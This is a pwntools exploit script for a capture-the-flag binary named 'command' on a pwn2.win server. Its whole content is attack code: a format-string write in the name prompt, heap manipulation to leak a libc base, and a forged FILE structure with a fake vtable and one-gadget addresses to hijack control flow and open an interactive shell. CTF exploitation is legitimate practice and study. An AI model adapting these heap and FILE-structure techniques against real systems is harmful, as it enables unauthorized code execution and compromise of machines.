from pwn import *
context.arch = 'amd64'

TARGET = './command'
HOST = 'command.pwn2.win'
PORT = 1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def add(prio, comm):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(prio))
    r.sendafter(': ', comm)

def review(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

def finish(num):
    r.sendlineafter('> ', '5')
    r.sendlineafter('rbs?\n', str(num))


r.sendafter('name: ', '%11792c%4$hn')

for i in range(9):
    add(0x114514, 'A'*0x170)

for i in range(9):
    delete(i)

for i in range(7): 
    add(0x114514, 'A')
    r.sendlineafter('> ', '4')
    
add(0x114514, 'A')
review(7)
r.recvuntil('Command: ')
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
base = leak - 0x3ebc41
dbg("leak")
dbg("base")

system = base + 0x4f440
fake_vtable = base + 0x3e82a0
call_rdx = base + 0x0002c9c3
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
payload = ''
payload += flat(1, 0x11)
payload += flat(2, 0x21)
payload += flat(3, 0x31)
payload += flat(4, 0x41)
payload += flat(5, 0x51)
payload += flat(6, 0x61)
payload += flat(7, 0x71)
payload += flat(8, 0x81)
payload += flat(9, 0x91)
payload += flat(0xa, 0xa1)
payload += flat(0xb, 0xb1)
payload += flat(0xc, 0)
payload += flat(0, 0)
payload += flat(0, base+gadget[0])
payload += flat(base+gadget[0], 0xf1)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(base + 0x3ed8b0, 0)
payload += flat(0, 0)
payload += flat(0, 0)

delete(7)
add(0x1111, payload)
context.log_level = 'debug' 
if args.D:
    debug(r, [0x135a])
add(0x2222, flat(fake_vtable+0xc8, call_rdx) * (0x170/0x10))

finish(0x114514)




r.interactive()
r.close()
